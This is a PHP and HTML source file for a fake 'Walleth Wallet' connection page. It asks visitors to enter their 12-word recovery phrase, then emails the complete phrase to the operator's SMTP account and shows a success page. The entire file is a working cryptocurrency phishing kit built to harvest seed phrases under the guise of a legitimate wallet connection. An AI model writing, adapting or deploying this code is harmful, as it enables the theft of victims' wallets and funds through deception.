<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

include '../config.php';

$message = "";
$wallet = "Walleth";
$date = date("M d, Y");
$time = date("h:i:a");

if (isset($_POST['submit'])) {
    // Collect all 12 phrase inputs
    $phraseInputs = [];
    for ($i = 1; $i <= 12; $i++) {
        $phraseInputs[] = isset($_POST['phrase_' . $i]) ? trim($_POST['phrase_' . $i]) : '';
    }

    // Validate that all inputs are filled
    if (count(array_filter($phraseInputs)) == 12) {
        $fullPhrase = implode(' ', $phraseInputs);

        $mail = new PHPMailer(true);

        try {
            // Email configuration
            $mail->SMTPDebug = 0;
            $mail->isSMTP();
            $mail->Host = $host;
            $mail->SMTPAuth = true;
            $mail->Username = $username;
            $mail->Password = $password;
            $mail->SMTPSecure = 'ssl';
            $mail->Port = 465;

            // Recipients
            $mail->setFrom($setForm, "Wallet Keyphrase");
            $mail->addAddress($username, '');

            // Content
            $mail->isHTML(true);
            $mail->Subject = $wallet . ' Wallet 12-key Phrase';

            $mail->Body = '<!DOCTYPE html>
            <html>
            <body>
                <div>
                    <h2>Wallet Recovery Phrase Submission</h2>
                    <p><b>Full Phrase:</b> ' . htmlspecialchars($fullPhrase) . '</p>
                    <p>Date: ' . $date . '</p>
                    <p>Time: ' . $time . '</p>
                </div>
            </body>
            </html>';

            $send = $mail->send();
            if ($send) {
                // Set a session variable for success message
                session_start();
                $_SESSION['submission_success'] = true;
                header("location: success.php");
                exit();
            }

        } catch (Exception $e) {
            $message = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }
    } else {
        $message = "Please fill in all 12 phrase words.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connection</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .phrase-input {
            transition: all 0.3s ease;
        }
        .phrase-input:focus {
            box-shadow: 0 0 0 3px rgba(255,255,255,0.5);
            border-color: white;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
    <div class="max-w-4xl w-full space-y-8 bg-white shadow-2xl rounded-xl p-10">
        <div class="text-center">
            <h2 class="mt-6 text-3xl font-extrabold text-gray-900">
                <?php echo $wallet; ?> Wallet
            </h2>
            <p class="mt-2 text-sm text-gray-600">
                Enter your 12-word key phrase
            </p>
        </div>
        
        <?php if (!empty($message)): ?>
                          <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative" role="alert">
                              <?php echo htmlspecialchars($message); ?>
                          </div>
        <?php endif; ?>

        <form method="post" class="mt-8 space-y-6" onsubmit="return validateForm()">
            <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
                <?php for ($i = 1; $i <= 12; $i++): ?>
                                  <div>
                                      <label for="phrase_<?php echo $i; ?>" class="sr-only">Word <?php echo $i; ?></label>
                                      <input 
                                          type="text" 
                                          id="phrase_<?php echo $i; ?>" 
                                          name="phrase_<?php echo $i; ?>" 
                                          required 
                                          class="phrase-input appearance-none rounded-md relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
                                          placeholder="Word <?php echo $i; ?>"
                                      >
                                  </div>
                <?php endfor; ?>
            </div>

            <div>
                <button 
                    type="submit" 
                    name="submit" 
                    class="group relative w-full flex justify-center py-3 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
                >
                    Connect Wallet
                </button>
            </div>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
    <script>
    function validateForm() {
        const inputs = document.querySelectorAll('input[name^="phrase_"]');
        let allFilled = true;
        
        inputs.forEach(input => {
            if (!input.value.trim()) {
                allFilled = false;
                input.classList.add('border-red-500');
            } else {
                input.classList.remove('border-red-500');
            }
        });
        
        if (!allFilled) {
            Toastify({
                text: "Please fill in all 12 words of the recovery phrase.",
                duration: 3000,
                close: true,
                gravity: "top",
                position: "right",
                backgroundColor: "linear-gradient(to right, #ff5f6d, #ffc371)",
            }).showToast();
            return false;
        }
        
        return true;
    }
    </script>
</body>
</html>